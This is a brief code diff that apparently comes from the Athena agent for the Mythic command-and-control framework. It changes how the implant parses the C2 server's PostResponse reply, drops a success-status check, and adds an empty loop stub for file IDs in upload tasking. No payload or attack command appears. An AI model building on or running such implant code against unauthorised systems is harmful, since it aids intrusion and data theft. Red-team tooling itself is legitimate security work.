@@ -144,9 +144,20 @@ namespace Athena
             {
                 var responseString = this.MythicConfig.currentConfig.Send(prr).Result;
                 PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
-                if (cs.responses.Count < 1 || cs.responses[0].status != "success")
+                if (cs.responses.Count < 1)
                 {
                     return false;
+                }
+                else
+                {
+                    foreach(var response in cs.responses)
+                    {
+                        if (!String.IsNullOrEmpty(response.file_id))
+                        {
+                            
+                            //Update the file id in the mythic upload tasking
+                        }
+                    }
                 }
             }
             catch
